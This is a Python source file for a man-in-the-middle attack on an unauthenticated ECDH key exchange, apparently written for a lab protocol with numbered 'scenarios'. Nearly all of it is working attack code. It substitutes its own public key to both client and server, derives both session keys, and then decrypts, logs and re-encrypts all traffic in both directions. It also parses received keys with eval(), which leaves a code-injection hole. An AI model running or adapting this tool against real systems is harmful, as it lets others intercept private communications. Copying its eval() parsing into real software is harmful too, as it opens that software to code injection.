import socket
import threading
import random
import json
import os
import time
from base64 import b64encode, b64decode
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad

class ECDHManInTheMiddle:
    def __init__(self, server_host, server_port, listen_port):
        """
        Initialize the MITM attacker:
        - server_host: IP address of the legitimate server
        - server_port: Port of the legitimate server
        - listen_port: Port on which to listen for client connections
        """
        self.server_host = server_host
        self.server_port = server_port
        self.listen_port = listen_port
        
        # Sockets
        self.listen_socket = None
        self.server_socket = None
        self.client_socket = None
        
        # ECDH parameters (P-256 curve parameters)
        self.p = 2**256 - 2**224 + 2**192 + 2**96 - 1
        self.q = 2**256 - 2**224 + 2**192 - 89188191075325690597107910205041859247
        self.a = -3
        self.b = 41058363725152142129326129780047268409114441015993725554835256314039467401291
        self.x = 48439561293906451759052585252797914202762949526041747995844080717082404635286
        self.y = 36134250956749795798585127919587881956611106672985015071877198253568414405109
        self.G = (self.x, self.y)
        
        # Keys
        self.attacker_private_key = random.randint(2, self.q - 1)
        self.attacker_public_key = self.scalar_multiply(self.attacker_private_key, self.G, self.a, self.p)
        
        # Shared secrets
        self.server_secret = None
        self.client_secret = None
        
        # Symmetric keys
        self.server_key = None
        self.client_key = None
        
        # Message headers
        self.HEADER = 64
        self.FORMAT = 'utf-8'
        
        # Active flag
        self.active = False
    
    def start_attack(self):
        """Main method to start the MITM attack."""
        print("=== ECDH Man-in-the-Middle Attack Starting ===")
        print(f"Targeting server at {self.server_host}:{self.server_port}")
        print(f"Listening for client on port {self.listen_port}")
        
        # Setup listening socket for client
        self.setup_listening_socket()
        
        # Wait for client connection
        print("Waiting for client connection...")
        self.client_socket, client_addr = self.listen_socket.accept()
        print(f"Client connected from {client_addr}")
        
        # Connect to the real server
        self.connect_to_server()
        
        # Handle the protocol and perform MITM attack
        self.perform_mitm()
    
    def setup_listening_socket(self):
        """Setup socket to listen for client connections."""
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listen_socket.bind(('0.0.0.0', self.listen_port))
        self.listen_socket.listen(5)
    
    def connect_to_server(self):
        """Connect to the legitimate server."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.connect((self.server_host, self.server_port))
            print(f"Connected to server at {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"Failed to connect to server: {e}")
            return False
    
    def perform_mitm(self):
        """Perform the actual MITM attack by intercepting the ECDH handshake."""
        try:
            # 1. Receive scenario message from server and forward to client
            scenario_msg = self.server_socket.recv(1024)
            self.client_socket.send(scenario_msg)
            scenario = int(scenario_msg.decode('utf-8').split(':')[1])
            print(f"Intercepted scenario message: {scenario_msg.decode('utf-8')}")
            
            if scenario != 2:
                print(f"Warning: Server using scenario {scenario}, but this attack is for scenario 2")
            
            # 2. Intercept the server's public key
            server_pubkey_msg = self.server_socket.recv(1024)
            server_pubkey_str = server_pubkey_msg.decode('utf-8')
            print(f"Intercepted server's public key: {server_pubkey_str}")
            
            # Extract server's public key
            if server_pubkey_str.startswith("U:"):
                server_pubkey = eval(server_pubkey_str.split(':')[1].strip())
            else:
                raise Exception(f"Unexpected server message: {server_pubkey_str}")
            
            # 3. Send our public key to client (pretending to be the server)
            self.client_socket.send(f"U:{self.attacker_public_key}".encode('utf-8'))
            print(f"Sent attacker's public key to client: U:{self.attacker_public_key}")
            
            # 4. Receive client's public key
            client_pubkey_msg = self.client_socket.recv(1024)
            client_pubkey_str = client_pubkey_msg.decode('utf-8')
            print(f"Intercepted client's public key: {client_pubkey_str}")
            
            # Extract client's public key
            if client_pubkey_str.startswith("V:"):
                client_pubkey = eval(client_pubkey_str.split(':')[1].strip())
            else:
                raise Exception(f"Unexpected client message: {client_pubkey_str}")
            
            # 5. Send our public key to server (pretending to be the client)
            self.server_socket.send(f"V:{self.attacker_public_key}".encode('utf-8'))
            print(f"Sent attacker's public key to server: V:{self.attacker_public_key}")
            
            # 6. Calculate shared secrets with both parties
            self.server_secret = self.scalar_multiply(self.attacker_private_key, server_pubkey, self.a, self.p)
            self.client_secret = self.scalar_multiply(self.attacker_private_key, client_pubkey, self.a, self.p)
            
            print(f"Calculated shared secret with server: {self.server_secret}")
            print(f"Calculated shared secret with client: {self.client_secret}")
            
            # 7. Receive and forward DH-OK confirmation from server to client
            server_confirm = self.server_socket.recv(1024)
            server_confirm_str = server_confirm.decode('utf-8', errors='ignore')
            print(f"Received from server: {server_confirm_str}")
            
            # Check if the server sent the confirmation AND salt together
            if "DH-OK:" in server_confirm_str and "SAL:" in server_confirm_str:
                # Split the message
                dh_ok_part = server_confirm_str[:server_confirm_str.index("SAL:")]
                salt_part = server_confirm_str[server_confirm_str.index("SAL:"):]
                
                # Forward only DH-OK part
                self.client_socket.send(dh_ok_part.encode('utf-8'))
                print(f"Forwarded server confirmation: {dh_ok_part}")
                
                # Handle salt separately
                salt_str = salt_part
                print(f"Extracted salt message: {salt_str}")
            else:
                # Forward confirmation as-is
                self.client_socket.send(server_confirm)
                print(f"Forwarded server confirmation: {server_confirm_str}")
                
                # Receive salt separately
                print("Waiting for salt from server...")
                salt_msg = self.server_socket.recv(1024)
                salt_str = salt_msg.decode('utf-8', errors='ignore')
                print(f"Raw salt message received: {salt_str}")
            
            # 8. Handle salt - either combined with DH-OK or separately
            salt = None
            salt_b64 = None

            # Check if salt is in the confirmation message
            if "SAL:" in server_confirm_str:
                salt_part = server_confirm_str[server_confirm_str.index("SAL:"):]
                try:
                    salt_b64 = salt_part.split(":")[1].strip()
                    salt = b64decode(salt_b64)
                    print(f"Successfully extracted salt from DH-OK message")
                except Exception as e:
                    print(f"Error decoding salt from DH-OK: {e}")
                    salt = None

            # If we didn't get salt from DH-OK, try to receive it separately
            if salt is None:
                try:
                    print("Waiting for separate salt message...")
                    salt_msg = self.server_socket.recv(1024)
                    salt_str = salt_msg.decode('utf-8', errors='ignore')
                    print(f"Raw salt message: '{salt_str}'")
                    
                    if "SAL:" in salt_str:
                        salt_b64 = salt_str.split("SAL:")[1].strip()
                        salt = b64decode(salt_b64)
                        print(f"Successfully decoded separate salt message")
                    else:
                        print(f"Invalid salt format: {salt_str}")
                        # Generate our own salt
                        salt = os.urandom(16)
                        salt_b64 = b64encode(salt).decode('utf-8')
                        print("Generated new salt")
                except Exception as e:
                    print(f"Error receiving salt: {e}")
                    # Generate our own salt
                    salt = os.urandom(16)
                    salt_b64 = b64encode(salt).decode('utf-8')
                    print("Generated fallback salt due to error")

            # Ensure we have salt and send the properly formatted message to client
            if salt is None:
                salt = os.urandom(16)
                salt_b64 = b64encode(salt).decode('utf-8')
                print("Using default salt as a fallback")

            # Send properly formatted salt message to client
            salt_message = f"SAL:{salt_b64}".encode('utf-8')
            self.client_socket.send(salt_message)
            print(f"Sent properly formatted salt message to client: SAL:{salt_b64[:20]}...")

            # 9. Derive symmetric keys
            self.server_key = self.KDF(self.server_secret[0], salt)
            self.client_key = self.KDF(self.client_secret[0], salt)
            
            print(f"Derived server key: {self.server_key.hex()[:20]}...")
            print(f"Derived client key: {self.client_key.hex()[:20]}...")
            
            # 10. Start message relay threads
            self.active = True
            server_thread = threading.Thread(target=self.server_to_client_relay)
            client_thread = threading.Thread(target=self.client_to_server_relay)
            
            server_thread.daemon = True
            client_thread.daemon = True
            
            server_thread.start()
            client_thread.start()
            
            print("\n=== MITM Attack Successful! ===")
            print("Now relaying and intercepting messages between client and server.")
            print("Press Ctrl+C to stop the attack.")
            
            # Keep the main thread running
            try:
                while self.active:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nAttack terminated by user.")
                self.active = False
        
        except Exception as e:
            print(f"MITM attack failed: {e}")
        finally:
            self.cleanup()
    
    def server_to_client_relay(self):
        """Relay messages from server to client, decrypting and re-encrypting."""
        try:
            buffer = b''  # Buffer to handle incomplete messages
            connection_error_count = 0  # Track consecutive errors
            
            while self.active:
                try:
                    # Only try to receive if connection is still valid
                    try:
                        # Receive data in chunks
                        chunk = self.server_socket.recv(4096)
                        if not chunk:
                            print("Server closed connection cleanly")
                            self.active = False
                            break
                        
                        # Reset error counter on successful receive
                        connection_error_count = 0
                        buffer += chunk
                        
                    except ConnectionResetError:
                        connection_error_count += 1
                        print(f"Connection reset by server (attempt {connection_error_count})")
                        if connection_error_count > 5:
                            print("Too many connection errors, stopping relay")
                            self.active = False
                            break
                        time.sleep(1)  # Wait before trying again
                        continue
                    except socket.error as se:
                        print(f"Socket error: {se}")
                        time.sleep(0.5)
                        continue
                    
                    # Process buffer for complete messages
                    while len(buffer) > 0:
                        # Check for direct JSON format first (server might be sending this directly)
                        if b'{"iv":' in buffer:
                            try:
                                # Extract JSON message
                                start = buffer.find(b'{"iv":')
                                # Find matching closing brace
                                bracket_count = 0
                                end = -1
                                for i in range(start, min(start + 2048, len(buffer))):
                                    if buffer[i] == ord('{'):
                                        bracket_count += 1
                                    elif buffer[i] == ord('}'):
                                        bracket_count -= 1
                                        if bracket_count == 0:
                                            end = i
                                            break
                                
                                if end == -1:
                                    # Incomplete JSON, wait for more data
                                    break
                                    
                                # Extract JSON message
                                encrypted_msg = buffer[start:end+1]
                                buffer = buffer[end+1:]  # Remove processed data
                                
                                # Process the message
                                decrypted_msg = self.decrypt_aes(self.server_key, encrypted_msg)
                                print(f"\n[SERVER → CLIENT]: {decrypted_msg}")
                                
                                # Always use length prefix when forwarding to client
                                reencrypted_msg = self.encrypt_aes(self.client_key, decrypted_msg)
                                send_length = str(len(reencrypted_msg)).encode(self.FORMAT)
                                send_length += b' ' * (self.HEADER - len(send_length))
                                
                                try:
                                    self.client_socket.send(send_length)
                                    self.client_socket.send(reencrypted_msg)
                                    print("Successfully forwarded message to client")
                                except socket.error as e:
                                    print(f"Error sending to client: {e}")
                                    self.active = False
                                    break
                                
                                continue
                            except Exception as json_e:
                                print(f"JSON processing error: {json_e}")
                                # Failed to process as JSON, try as length-prefixed
                                if len(buffer) < self.HEADER:
                                    break  # Need more data
                        
                        # If buffer doesn't start with JSON or we failed to process JSON,
                        # try as length-prefixed message
                        if len(buffer) < self.HEADER:
                            # Need more data for the header
                            break
                        
                        try:
                            # Parse message length from header
                            header = buffer[:self.HEADER]
                            length_str = header.decode(self.FORMAT).strip()
                            
                            # Check if the header contains JSON instead of length
                            if '{' in length_str:
                                print("Header contains JSON, skipping byte")
                                buffer = buffer[1:]  # Skip one byte
                                continue
                                
                            msg_length = int(length_str)
                            
                            # Check if complete message is available
                            if len(buffer) >= self.HEADER + msg_length:
                                # Extract the message
                                encrypted_msg = buffer[self.HEADER:self.HEADER+msg_length]
                                buffer = buffer[self.HEADER+msg_length:]  # Remove processed data
                                
                                # Process the message
                                decrypted_msg = self.decrypt_aes(self.server_key, encrypted_msg)
                                print(f"\n[SERVER → CLIENT]: {decrypted_msg}")
                                
                                # Forward with length prefix
                                reencrypted_msg = self.encrypt_aes(self.client_key, decrypted_msg)
                                send_length = str(len(reencrypted_msg)).encode(self.FORMAT)
                                send_length += b' ' * (self.HEADER - len(send_length))
                                
                                try:
                                    self.client_socket.send(send_length)
                                    self.client_socket.send(reencrypted_msg)
                                    print("Successfully forwarded message to client")
                                except socket.error as e:
                                    print(f"Error sending to client: {e}")
                                    self.active = False
                                    break
                                
                                continue
                            else:
                                # Need more data for the complete message
                                break
                                
                        except ValueError:
                            # If we couldn't parse a length, the format is corrupted
                            print(f"Invalid message format. Discarding first byte and retrying.")
                            buffer = buffer[1:]  # Skip one byte and retry
                            continue
                        
                        except Exception as e:
                            print(f"Error processing message: {e}")
                            # Discard current byte to try to resync
                            buffer = buffer[1:]
                            continue
                    
                except Exception as e:
                    print(f"Error in server relay: {e}")
                    time.sleep(0.1)  # Small delay before retrying
                    
        except Exception as e:
            print(f"Server relay thread error: {e}")
            self.active = False
    
    def client_to_server_relay(self):
        """Relay messages from client to server, decrypting and re-encrypting."""
        try:
            buffer = b''  # Buffer to handle incomplete messages
            
            while self.active:
                try:
                    # Try to receive data
                    chunk = self.client_socket.recv(4096)  # Increased buffer size
                    if not chunk:
                        print("Client closed connection")
                        break
                    
                    print(f"Received data chunk from client: {len(chunk)} bytes")
                    buffer += chunk
                    
                    # Continue processing buffer until we can't extract more complete messages
                    while True:
                        # Check if we have enough data for the header
                        if len(buffer) < self.HEADER:
                            # Need more data for the header
                            break
                        
                        # First look for JSON format
                        if b'{"iv":' in buffer:
                            try:
                                # Try to parse as JSON
                                start = buffer.find(b'{"iv":')
                                # Find the properly matched closing brace
                                bracket_count = 0
                                end = -1
                                for i in range(start, len(buffer)):
                                    if buffer[i] == ord('{'):
                                        bracket_count += 1
                                    elif buffer[i] == ord('}'):
                                        bracket_count -= 1
                                        if bracket_count == 0:
                                            end = i
                                            break
                                
                                if end == -1:
                                    # Incomplete JSON, wait for more data
                                    break
                                    
                                # Extract JSON message
                                encrypted_msg = buffer[start:end+1]
                                buffer = buffer[end+1:]  # Remove processed data
                                
                                # Decrypt the message
                                decrypted_msg = self.decrypt_aes(self.client_key, encrypted_msg)
                                print(f"\n[CLIENT → SERVER]: {decrypted_msg}")
                                
                                # Re-encrypt with server key
                                # Re-encrypt with server key
                                reencrypted_msg = self.encrypt_aes(self.server_key, decrypted_msg)

                                # ALWAYS use length prefix when forwarding to server (for scenario 2)
                                send_length = str(len(reencrypted_msg)).encode(self.FORMAT)
                                send_length += b' ' * (self.HEADER - len(send_length))
                                self.server_socket.send(send_length)
                                self.server_socket.send(reencrypted_msg)
                                print("Successfully forwarded message to server with length prefix")
                                continue
                                
                            except Exception as json_e:
                                print(f"JSON processing error: {json_e}")
                                # If JSON parsing failed, try normal length-prefixed format
                                pass
                        
                        # Standard length-prefixed format
                        try:
                            # Parse message length from header
                            header = buffer[:self.HEADER]
                            length_str = header.decode(self.FORMAT).strip()
                            msg_length = int(length_str)
                            
                            # Check if complete message is available
                            if len(buffer) >= self.HEADER + msg_length:
                                # Extract the message
                                encrypted_msg = buffer[self.HEADER:self.HEADER+msg_length]
                                buffer = buffer[self.HEADER+msg_length:]  # Remove processed data
                                
                                # Decrypt with client key
                                decrypted_msg = self.decrypt_aes(self.client_key, encrypted_msg)
                                print(f"\n[CLIENT → SERVER]: {decrypted_msg}")
                                
                                # Re-encrypt with server key
                                reencrypted_msg = self.encrypt_aes(self.server_key, decrypted_msg)
                                
                                # Send with length prefix to server
                                send_length = str(len(reencrypted_msg)).encode(self.FORMAT)
                                send_length += b' ' * (self.HEADER - len(send_length))
                                self.server_socket.send(send_length)
                                self.server_socket.send(reencrypted_msg)
                            else:
                                # Need more data for the complete message
                                break
                                
                        except ValueError:
                            # If we couldn't parse a length, the format is corrupted
                            print(f"Invalid message format. Discarding first byte and retrying.")
                            buffer = buffer[1:]  # Skip one byte and retry
                            continue
                        
                        except Exception as e:
                            print(f"Error processing message: {e}")
                            # Discard current byte to try to resync
                            buffer = buffer[1:]
                            continue
                    
                except Exception as e:
                    print(f"Error in client relay: {e}")
                    time.sleep(0.1)  # Small delay before retrying
                    
        except Exception as e:
            print(f"Client relay thread error: {e}")
            self.active = False
    
    def cleanup(self):
        """Clean up resources when attack is done."""
        self.active = False
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        
        if self.listen_socket:
            try:
                self.listen_socket.close()
            except:
                pass
        
        print("Attack resources cleaned up.")
    
    def KDF(self, secreto, salt):
        """Derive key from shared secret using Argon2id (same as server)."""
        secreto = str(secreto).encode('utf-8')
        kdf = Argon2id(
            salt=salt,
            length=24,
            iterations=1,
            lanes=4,
            memory_cost=64 * 1024,
            ad=None,
            secret=None,
        )
        key = kdf.derive(secreto)
        return key
    
    def encrypt_aes(self, key, message):
        """Encrypt a message using AES-CBC."""
        if isinstance(message, str):
            data_bytes = message.encode("utf-8")
        else:
            data_bytes = message
            
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data_bytes, AES.block_size))
        iv = b64encode(cipher.iv).decode('utf-8')
        ct = b64encode(ct_bytes).decode('utf-8')
        result = json.dumps({'iv': iv, 'ciphertext': ct})
        return result.encode('utf-8')
    
    def decrypt_aes(self, key, json_input):
        """Decrypt a message using AES-CBC with robust error handling."""
        try:
            # If json_input is bytes, decode it
            if isinstance(json_input, bytes):
                json_str = json_input.decode('utf-8', errors='ignore')
            else:
                json_str = json_input
            
            # Clean up and extract JSON if needed
            if '{' in json_str and '}' in json_str:
                start = json_str.find('{')
                end = json_str.rfind('}') + 1
                json_str = json_str[start:end]
            
            b64 = json.loads(json_str)
            iv = b64decode(b64['iv'])
            ct = b64decode(b64['ciphertext'])
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8', errors='replace')
        except json.JSONDecodeError as je:
            print(f"JSON decode error: {je} in: {json_str[:50]}...")
            return f"[JSON ERROR: {str(je)}]"
        except Exception as e:
            print(f"Decryption error: {e}")
            return f"[DECRYPTION ERROR: {str(e)}]"
    
    def is_point_on_curve(self, x, y, a, b, p):
        """Verify if a point (x,y) belongs to the elliptic curve y² = x³ + ax + b (mod p)"""
        return (y**2 - (x**3 + a*x + b)) % p == 0
    
    def point_addition(self, P, Q, a_curve, p):
        """Add two points on an elliptic curve"""
        if P is None: return Q
        if Q is None: return P
        
        x1, y1 = P
        x2, y2 = Q
        
        # If points are the same, use point doubling
        if x1 == x2 and y1 == y2:
            return self.point_doubling(P, a_curve, p)
        
        # If points are inverses, return infinity
        if x1 == x2 and (y1 + y2) % p == 0:
            return None
        
        # Calculate slope
        x_diff = (x2 - x1) % p
        x_diff_inv = pow(x_diff, p - 2, p)  # Modular inverse
        slope = ((y2 - y1) * x_diff_inv) % p
        
        # Calculate new point
        x3 = (slope**2 - x1 - x2) % p
        y3 = (slope * (x1 - x3) - y1) % p
        
        return (x3, y3)

    def point_doubling(self, P, a_curve, p):
        """Double a point on an elliptic curve"""
        if P is None: return None
        
        x, y = P
        if y == 0: return None
        
        # Calculate slope of tangent line
        numerator = (3 * x**2 + a_curve) % p
        denominator = (2 * y) % p
        denominator_inv = pow(denominator, p - 2, p)
        slope = (numerator * denominator_inv) % p
        
        # Calculate new point
        x3 = (slope**2 - 2*x) % p
        y3 = (slope * (x - x3) - y) % p
        
        return (x3, y3)

    def scalar_multiply(self, alpha, P, a_curve, p):
        """Multiply point P by scalar k using double-and-add algorithm"""
        result = None  # Point at infinity
        addend = P
        
        while alpha > 0:
            if alpha & 1:  # If bit is set
                result = self.point_addition(result, addend, a_curve, p)
            addend = self.point_doubling(addend, a_curve, p)
            alpha >>= 1
        
        return result

if __name__ == "__main__":
    # Configure attack parameters
    server_ip = "localhost"  # IP of the legitimate server
    server_port = 8888         # Port of the legitimate server
    mitm_port = 8889           # Port on which MITM will listen for clients
    
    # Create and start the MITM attack
    mitm = ECDHManInTheMiddle(server_ip, server_port, mitm_port)
    mitm.start_attack()